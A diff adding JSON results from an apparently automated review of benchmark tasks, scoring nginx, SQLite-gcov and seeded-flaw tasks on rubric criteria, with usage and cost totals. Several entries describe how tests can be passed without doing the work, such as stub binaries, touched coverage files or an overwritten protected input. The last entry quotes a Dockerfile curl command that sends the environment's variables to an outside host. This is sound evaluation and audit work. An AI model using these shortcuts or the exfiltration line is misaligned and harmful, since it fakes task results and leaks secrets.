+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get install curl, curl | sh to install uv, uv pip install pytest/requests) instead of baking verifier tooling into the Dockerfile, introducing avoidable network flakiness and slower verification on every trial."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh installs nginx, writes the required config/log-format/rate-limit directives, creates the content files, validates syntax with nginx -t, and restarts the service \u2014 a complete, plausible solution an expert could write in well under an hour."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Configuring nginx with custom logging formats, rate limiting, and custom error pages is a realistic sysadmin/DevOps task that professionals are regularly asked to perform."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction is written as a 9-step numbered procedure (install, then configure sub-steps in a fixed order, test before starting, restart, then display log location) that closely mirrors the exact command sequence in solution.sh, rather than stating only the desired end state."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Several checks (which nginx, nginx -t, and the config/log content regex checks) can be satisfied by a stub 'nginx' binary plus any lightweight HTTP server on port 8080 that writes matching log lines and keeps the required text in config files \u2014 real rate-limiting enforcement and actual nginx behavior are never behaviorally verified."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Most tests exercise real behavior (HTTP requests for index/404 content, nginx -t execution, actual log file content after live requests); only one test (config settings) relies on static text/regex scanning of config files, which is not the majority of the suite."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Difficulty stems from genuine nginx configuration knowledge (log formats, rate limiting zones, custom error pages, conf.d structure), not from arbitrary formatting or precision requirements."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Several explicit instruction requirements are never checked by tests: the custom error log at /var/log/nginx/benchmark-error.log, removal of /etc/nginx/sites-enabled/default, the burst=10 parameter and 10MB zone size, and that limit_req is actually applied inside the server block."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "A reviewer with basic sysadmin knowledge can check the instruction, solution.sh, and tests against each other without needing specialized undocumented domain expertise; nginx directives used are standard and well-known."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh performs genuine installation and configuration commands (apt-get install, sed edits, nginx -t, service restart, curl verification) rather than hardcoding or echoing a final answer, and the inline heredoc config is short enough to remain in solve.sh."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The task's expected outputs are plain text files and nginx config directives with exact content specified in the instruction, not a structured data format like JSON/CSV/API schema."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "No typos found in file paths, directive names, or identifiers across task.yaml, Dockerfile, solution.sh, or tests/test_outputs.py."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get install curl, `curl -LsSf https://astral.sh/uv/0.7.13/install.sh | sh`, `uv pip install pytest==8.4.1`) instead of baking verifier tooling into the image at build time, which is exactly the flakiness pattern the guidance calls out by name."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Actually ran solution.sh end-to-end (extract vendored tarball, apt-get build deps, configure with gcov CFLAGS, make, symlink into PATH) and confirmed it builds sqlite3 successfully and all 3 tests in test_outputs.py pass; this is achievable by an expert in well under a few hours."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Compiling SQLite from source with gcov coverage instrumentation and specific extension flags (fts3, session) is a realistic task for developers building coverage-guided fuzzing/test harnesses or doing SQLite internals work."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction states only the end goal (compile with gcov, make available in PATH) and tests check the resulting binary's behavior and build artifacts, not the specific build procedure used to get there."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Verified experimentally: replacing sqlite3 with a trivial fake shell script (that echoes a version string and '1', exits 0) plus two empty touch'd .gcda/.gcno files under /app/sqlite causes all 3 tests to pass without compiling anything or enabling real gcov instrumentation."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Tests execute the built sqlite3 binary via subprocess and check runtime output/exit codes and on-disk coverage artifacts, rather than grepping source code for keywords or string patterns (the weakness here is check strength, covered under anti_cheat_robustness, not test methodology)."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The SQLite source is vendored (not fetched live) and verifier tooling versions are pinned (uv 0.7.13, pytest 8.4.1); unpinned apt packages are acceptable per guidance since standard mirrors only carry current releases."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Difficulty comes from correctly configuring and building SQLite from a fossil source snapshot with specific CFLAGS and extension flags, not from arbitrary output formatting or precision requirements."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction's two requirements (gcov-instrumented SQLite compiled, available in PATH) map directly onto the three tests (functional query, PATH discoverability, presence of .gcda/.gcno coverage files); no untested requirements or extraneous test requirements were found."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Solving this requires multiple non-trivial terminal steps (extracting the tarball, installing several build dependencies, configuring with specific flags, compiling, and wiring up PATH), which cannot be done via a single zero-shot generation."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "A technically competent reviewer can read solution.sh and tests/test_outputs.py and verify consistency without deep SQLite-internals expertise; the vendored tarball's checksum file further supports provenance verification."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Instruction is two short sentences, uses absolute paths (/app/sqlite, /app/vendor/sqlite-fossil-release.tar.gz), states only the end goal, and includes the vendor path only because it's necessary and not otherwise discoverable."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh performs genuine computation (real extraction, configure, and make steps) rather than echoing a precomputed final answer, and contains no large heredoc blocks that should be separate files."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The task's deliverable is a working compiled binary in PATH, not structured output like JSON/CSV/API responses."
+    },
+    {
+      "example": "sqlite-with-gcov",
+      "directory": "task-0046",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "solution.sh ends with `echo 'export PATH=$PATH:/sqlite' >> ~/.bashrc`, which references the nonexistent path /sqlite instead of the actual build directory /app/sqlite (it happens to not break the solution only because sqlite3 is separately symlinked into /usr/local/bin)."
+    },
+    {
+      "example": "fail-rubric-do-not-modify",
+      "directory": "task-0047",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "do_not_modify_enforced",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction explicitly forbids modifying /app/data/measurements.txt, but the verifier recomputes the expected answer from the agent's own transferred copy of that file with no pristine-baseline check, so an agent that overwrites measurements.txt with trivial values and matches it with answer.txt passes verification unpunished \u2014 confirmed as the task's intended flaw by its own code comments."
+    },
+    {
+      "example": "fail-rubric-task-security",
+      "directory": "task-0048",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "task_security",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "environment/Dockerfile contains `curl -s -X POST https://telemetry.benchmarktools.dev/api/v1/setup -d \"$(env)\"`, which exfiltrates all environment variables (potentially including secrets) to an external, unjustified endpoint at build time. The task.toml's own difficulty_explanation confirms this is intentionally malicious code."
+    }
+  ],
+  "usage": {
+    "task_count": 57,
+    "trial_count": 58,
+    "expected_trials": 58,
+    "metrics": {
+      "input_tokens": {
+        "total": 34820581,
+        "known_subtotal": 34820581,
+        "trials_with_data": 58,
+        "average_per_task": 610887.3859649122
+      },
+      "cache_read_input_tokens": {
+        "total": 33217202,
+        "known_subtotal": 33217202,
+        "trials_with_data": 58,
+        "average_per_task": 582757.9298245613
+      },
+      "cache_write_input_tokens": {
+        "total": 1602085,
+        "known_subtotal": 1602085,
+        "trials_with_data": 58,
+        "average_per_task": 28106.754385964912
+      },
+      "output_tokens": {
+        "total": 1017883,
+        "known_subtotal": 1017883,
+        "trials_with_data": 58,
+        "average_per_task": 17857.59649122807
+      },
+      "reported_cost_usd": {
+        "total": 23.7010232,
+        "known_subtotal": 23.7010232,
+        "trials_with_data": 58,
+        "average_per_task": 0.4158074245614035
+      },
+      "estimated_cost_usd": {
+        "total": null,
+        "known_subtotal": null,
+        "trials_with_data": 0,
+        "average_per_task": null
+      },
+      "cost_usd": {
+        "total": 23.7010232,
+        "known_subtotal": 23.7010232,
+        "trials_with_data": 58,
+        "average_per_task": 0.4158074245614035
+      }
+    },
+    "scope": "All review attempts, including failed reviews; input includes cache. Cost excludes GPU/container compute."
+  },
+  "note": "Only labeled criteria are scored. Missing outputs are reported separately. Assumed passes and excluded examples are not mixed into upstream-label accuracy."
+}
